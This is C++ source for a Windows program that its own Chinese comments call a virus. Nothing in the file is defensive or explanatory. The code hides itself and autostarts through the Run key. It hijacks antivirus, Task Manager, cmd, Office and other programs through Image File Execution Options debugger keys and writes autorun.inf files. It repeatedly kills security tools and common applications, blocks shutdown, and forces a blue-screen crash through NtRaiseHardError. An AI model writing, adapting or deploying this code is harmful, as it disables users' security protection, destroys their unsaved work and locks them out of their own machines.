#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <direct.h>
using namespace std;
BOOL UpPrivilegeValue()//提个权限 
{
	HANDLE hToken=0;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken))
	{
		return FALSE;
	}
	LUID luid;
	if(!LookupPrivilegeValue(0,SE_DEBUG_NAME,&luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	TOKEN_PRIVILEGES Tok;
	Tok.PrivilegeCount=1;
	Tok.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	Tok.Privileges[0].Luid=luid;
	if(FALSE==AdjustTokenPrivileges(hToken,FALSE,&Tok,sizeof(Tok),0,0))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	if(GetLastError()==ERROR_NOT_ALL_ASSIGNED)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}
DWORD WINAPI NOSHUT(LPVOID Param)
{
	while(1)
	{
		system("shutdown -a");//防止关机 
		Sleep(500);
	}
}
DWORD WINAPI WEB(LPVOID Param)
{
	while(1)
	{
		Sleep(30000);
		system("start luogu.com.cn");
		Sleep(30000);
		system("start cn.bing.com");
		Sleep(30000);
		system("start zzcjas.github.io");
		Sleep(30000);
		system("start github.com");
		Sleep(30000);
		system("start githubs.com");
		Sleep(30000);
		system("start luogu.org");//开网站吓唬用户 
	}
}
DWORD WINAPI BSOD(LPVOID Param)
{
	while(1)
	{
		Sleep(950000);
		HMODULE ntdll = LoadLibrary("ntdll.dll");
	 	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");
	 	FARPROC NtRaiseHardErr=GetProcAddress(ntdll,"NtRaiseHardError");
	 	unsigned char ErrKill;
	 	long unsigned int HDErr;
	 	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13,true,false,&ErrKill);
	 	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(0xc0000233,0,0,0,6, &HDErr);
	}
}//吓唬用户的蓝屏 
DWORD WINAPI FILEop(LPVOID Param)
{
	char pathn[6145];
	ZeroMemory(&pathn,sizeof(pathn));
	_getcwd(pathn,6145);
	string p=pathn;
	string kkk="";
	if(p.find("C:\\")!=string::npos)
	{
		kkk="C:\\autorun.inf";
	}
	else if(p.find("D:\\")!=string::npos)
	{
		kkk="D:\\autorun.inf";
	}
	else
	{
		kkk="E:\\autorun.inf";
	}
	string autorun="[AutoRun]\nOpen=";
	autorun+=p;
	autorun+="\\病毒.exe";
	FILE *a=fopen(kkk.c_str(),"w");
	fprintf(a,"%s",autorun.c_str());
	fclose(a);//向C盘D盘写入autorun.inf文件,一点图标便会再次运行病毒 
	while(1)
	{
		string s="9T.@1D! 1:U1;9TUI1?HV\"\"HVE$(\" 3L25 /% 3%L /5(7(342L5$25L'(-$@E)J)K";//用异或加密了的反病毒测试代码(免得源代码被删了) 
		for(register int i=0;i<s.size();i++)
		{
			s[i]^='a';
		}//解密 
		FILE *p=fopen("C:\\virus.com","w");//哈哈哈 
		fprintf(p,"%s",s.c_str());//C盘释放反病毒测试代码吓一下用户 
		fclose(p);
		p=fopen("D:\\virus.com","w");//哈哈哈 
		fprintf(p,"%s",s.c_str());//D盘释放反病毒测试代码吓一下用户 
		fclose(p);
		system("cd /d C:\\Program Files\\Windows Defender");
		system("mpcmdrun.exe -scan -1 -disableremediation");//让Windows自带杀毒软件扫描一遍,肯定会报警,再吓一下用户 
		Sleep(240000);
	}
}//弄个反病毒测试代码吓一下用户
DWORD WINAPI KILL(LPVOID Param)
{
	while(1)
	{
		DWORD ProcessId=0;
		HANDLE hProcessSnapShot=NULL;
		PROCESSENTRY32 pe32;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("devcpp.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	HANDLE hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("360safe.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("360tray.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("hipstray.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("kxetray.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("Taskmgr.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("360sd.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("Mcshield.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("avp.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("avcenter.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("AST.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("avgaurd.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("BaiduSdSvc.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
    	system("taskkill /im avgaurd.exe /f");
    	Sleep(100);
    	system("taskkill /im AST.exe /f");
    	Sleep(100);
    	system("taskkill /im BaiduSdSvc.exe /f");
    	Sleep(100);
    	system("taskkill /im avcenter.exe /f");
    	Sleep(100);
    	system("taskkill /im avp.exe /f");
    	Sleep(100);
    	system("taskkill /im hipstray.exe /f");
    	Sleep(100);
    	system("taskkill /im 360sd.exe /f");
    	Sleep(100);
    	system("taskkill /im kxetray.exe /f");
    	Sleep(100);
    	system("taskkill /im msedge.exe /f");
    	Sleep(100);
    	system("taskkill /im chrome.exe /f");
    	Sleep(100);
    	system("taskkill /im notepad.exe /f");
    	Sleep(100);
    	system("taskkill /im write.exe /f");
    	Sleep(100);
    	system("taskkill /im 360tray.exe /f");
    	Sleep(100);
    	system("taskkill /im devcpp.exe /f");
    	Sleep(100);
    	system("taskkill /im mspaint.exe /f");
    	Sleep(100);
    	system("taskkill /im WINWORD.EXE /f");
    	Sleep(100);
    	system("taskkill /im EXCEL.EXE /f");
    	Sleep(100);
    	system("taskkill /im POWERPNT.EXE /f");
    	Sleep(100);
    	system("taskkill /im ONENOTE.EXE /f");
    	Sleep(100);
    	system("taskkill /im ONENOTEM.EXE /f");
    	Sleep(100);
    	system("taskkill /im WeChat.exe /f");
    	Sleep(100);
    	system("taskkill /im WechatBrowser.exe /f");
    	Sleep(100);
    	system("taskkill /im Mcshield.exe /f");
    	Sleep(100);
    	system("taskkill /im scan32.exe /f");
    	Sleep(100);
    	system("taskkill /im UpdaterUI.exe /f");
    	Sleep(100);
    	system("taskkill /im TBMon.exe /f");
    	Sleep(100);
    	system("taskkill /im Rav.exe /f");
    	Sleep(100);
    	system("taskkill /im wemeetapp.exe /f");
    	Sleep(100);
    	system("taskkill /im iexplorer.exe /f");
    	Sleep(100);
    	system("taskkill /im ielowutil.exe /f");
    	Sleep(100);
    	system("taskkill /im qq.exe /f");
    	Sleep(100);
    	system("taskkill /im studentmain.exe /f");
    	Sleep(100);
    	system("taskkill /im SecHealthUI.exe /f");
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("SecHealthUI.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);//爆杀360,金山毒霸,小红伞,卡巴斯基,火绒等杀毒软件 
    	ProcessId=0;
		hProcessSnapShot=NULL;
		ZeroMemory(&pe32,sizeof(pe32));
		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		pe32.dwSize=sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnapShot,&pe32))
		{
			do
			{
				if("studentmain.exe"==(string)(pe32.szExeFile))
				{
					ProcessId=pe32.th32ProcessID;
					break;
				}
			}while(Process32Next(hProcessSnapShot,&pe32));
		}
		::CloseHandle(hProcessSnapShot);
    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    	TerminateProcess(hProcess,0);
    	Sleep(1000);
		Sleep(360000);
	}
}//把常用进程+杀毒软件炸了(顺便帮个忙,把极域课堂杀了)
char pathn[6145];
string k;
void CreateReg(HKEY Root,char*szSubKey,char* ValueName,char* Data)
{
	HKEY key;
	long Ret=RegCreateKeyEx(Root,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&key,NULL);
    Ret=RegSetValueEx(key,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
	RegCloseKey(key);
}
int main()
{
	ShowWindow(GetForegroundWindow(),0);//隐藏窗口 
	UpPrivilegeValue();//提权 
	_getcwd(pathn,6145);//得路径 
	k=pathn;
	k+="\\病毒.exe";
	SetFileAttributes((char*)k.c_str(),FILE_ATTRIBUTE_HIDDEN);//隐藏文件 
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Run","病毒.exe",(char*)k.c_str()); //开机自启动 
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\qq.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Taskmgr.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\write.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\studentmain.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplorer.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WINWORD.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\POWERPNT.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ONENOTE.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\EXCEL.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mspaint.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SecHealthUI.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\360safe.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\360tray.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AST.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\avp.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\360tray.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SecHealthUI.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Mcshield.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\kxetray.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\avcentre.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\avgaurd.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\hipstray.exe","Debugger",(char*)k.c_str());
	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe","Debugger",(char*)k.c_str());//映像劫持 
    FILE *lock=fopen("病毒.exe","rb");//锁死文件,杀不掉 
	CreateThread(NULL,4096,&NOSHUT,NULL,NULL,NULL);
	CreateThread(NULL,4096,&WEB,NULL,NULL,NULL);
	CreateThread(NULL,4096,&BSOD,NULL,NULL,NULL);
	CreateThread(NULL,6144,&KILL,NULL,NULL,NULL);
	CreateThread(NULL,4096,&FILEop,NULL,NULL,NULL);
	while(1);
}
